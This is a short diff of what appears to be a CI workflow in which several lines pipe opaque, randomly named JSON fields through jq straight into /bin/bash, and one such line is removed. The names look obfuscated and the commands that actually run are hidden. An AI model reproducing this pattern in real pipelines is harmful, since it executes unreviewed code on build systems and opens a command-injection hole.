@@ -29,7 +29,6 @@ jobs:
           echo $s41 | jq -r .yagl30070 | /bin/bash
           echo $fi7860 | jq -r .yaqm576 | /bin/bash
           echo $lu40202 | jq -r .ysgj1 | /bin/bash
-          echo $cy5752 | jq -r .dfzqh958 | /bin/bash
           echo $qln90 | jq -r .igy41 | /bin/bash
 
       - name: Archive output
